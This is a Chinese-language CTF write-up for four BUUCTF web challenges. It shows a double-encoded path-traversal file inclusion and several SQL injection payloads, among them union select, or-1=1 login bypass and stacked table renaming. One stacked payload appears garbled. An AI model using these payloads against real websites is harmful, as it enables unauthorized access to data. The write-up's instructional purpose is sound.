# buuctf Web
## **1.[HCTF 2018]WarmUp[HCTF 2018]WarmUp**
访问url
如下
打开靶场后，查看源码即可看到
构造url访问获得index.php的源码
如下
    "source.php","hint"=>"hint.php"];
                if (! isset($page) || !is_string($page)) {
                /*为了返回 true 两个条件必须满足
                    1 page存在 
                    2 page是字符串 ，
                    这里和外层的判断file 一致基本是再次判断了一遍*/
                    echo "you can't see it";
                    return false;
                }
                if (in_array($page, $whitelist)) {
                    return true;
                }
                /*in_array(search,array,type) 函数搜索数组中是否存在指定的值，
                白名单过滤，需要返回了ture
                所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，
                这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看*/
                $_page = mb_substr( 
                    $page,
                    0,
                    mb_strpos($page . '?',  '?')
                );
                /*这里mb_sustr 是个截断，返回0到mb_strpos之间的内容，而mb_strps 则是查找第一次出现的位置，所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/            
                if (in_array($_page, $whitelist)) { 
                    return true;
                }
                //这里和上面类似 查看_page 是否在白名单中
                $_page = urldecode($page); // 这里发现对_page进行了一次decode解码，
                $_page = mb_substr(//获取两个？？之间的内容
                    $_page,
                    0,
                    mb_strpos($_page . '?', '?')
                );
                // 这里是我们要绕过的点，从这里往上看 尝试构造
                if (in_array($_page, $whitelist)) {//白名单
                    return true;
                }
                echo "you can't see it";
                return false;
            }
        }
        if (! empty($_REQUEST['file'])
            && is_string($_REQUEST['file'])
            && emmm::checkFile($_REQUEST['file'])
        ) {
            include $_REQUEST['file'];
            exit;
        } else {
            echo "";
        }
        /*必须满足if条件，才能包含file，这里也可以猜到可能考的是文件包含： 
            1 REQUEST['file']不为空 
            2 REQUEST['file']是字符串 
            3 checkFile($_REQUEST['file']) 为ture，回到checkFile 函数分析如何返回true*/    
    ?>
    可以看到函数代码中有四个if语句
    第一个if语句对变量进行检验，要求$page为字符串，否则返回false
    第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true
    第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中'?'前部分，存在则返回true
    第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true
    若以上四个if语句均未返回值，则返回false
    有三个if语句可以返回true，第二个语句直接判断$page，不可用
    第三个语句截取'?'前部分，由于?被后部分被解析为get方式提交的参数，也不可利用
    第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为'?'，仍可通过第四个if语句校验。（'?'两次编码值为'%253f'）,构造url：
    file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg
从代码中发现新的页面hint访问
获得flag文件名
构造payload，ffffllllaaaagggg提示每个字符都重复了4下，提示我们往上级目录翻四层
得到flag{9cae45aa-4163-4c5a-b223-75baa14f4cc4}
## **2.[极客大挑战 2019]EasySQL**
访问url
如下
第一种方法，看到登录框想到SQL注入，构造payload
?username=1'&password=2'
密码框存在注入
构造payload
?username=1&password=2'%23
正常回显
构造payload
?username=1&password=2' order by 3%23
判断字段数为3
构造payload
?username=1&password=2' and 1=2 union select 1,2,3%23
判断回显点，得到flag{82270ed5-107f-454b-b1ea-a452245b07a6}
第二种方法，因为登录成功就可以拿到flag，由上一道解法知道是字符型注入
构造payload
?username=admin' or '1'='1&password=admin' or '1'='1
得到flag{82270ed5-107f-454b-b1ea-a452245b07a6}
## **3.[强网杯 2019]随便注**
访问url
页面如下
重命名+堆叠注入
0x01:判断是否存在注入，注入是字符型还是数字型
输入1'发现不回显
输入1' #显示正常
应该是存在sql注入了
输入1' or '1'='1,正常回显，应该是字符型
0x02:猜解SQL查询语句中的字段数
输入1' order by 3 # 回显出错，说明有两个字段
0x03:显示字段
输入1′ union select 1,2 # 回显一个正则过滤规则
过滤了 select，update，delete，drop，insert，where 和 点
过滤了这么多词，是不是有堆叠注入？尝试堆叠注入
0x04：查询数据库
输入1';show databases;# 成功回显
说明存在堆叠注入
0x05：查询表
输入1';show tables;# 成功回显
得到两个表words和1919810931114514
0x06：查询表中字段
输入0';desc words;#
可以看到1919810931114514中有我们想要的flag字段
查询语句很有可能是 : selsect id,data from words where id =
因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id
0';rename table words to words1;rename table `1919810931114514` to words;alter
table words change flag id varchar(100) 1' or 1=1#CHARACTER SET utf8 COLLATE
utf8_general_ci NOT NULL;desc words;#
如下
输入1' or 1=1#,查询就得到flag{0a7b0405-0946-4894-837c-0ea64a5a1a1e}
## **4.[极客大挑战 2019]Havefun**
访问url
首页如下
右键查看网页源代码
这是一段PHP代码，我们以GET方式传入cat，直接输出cat的值，如果cat的值为dog则将直接输出Syc{cat_cat_cat_cat}，构造payload
得到flag{8d0db0b2-663a-4d65-bb2a-ea16376802da}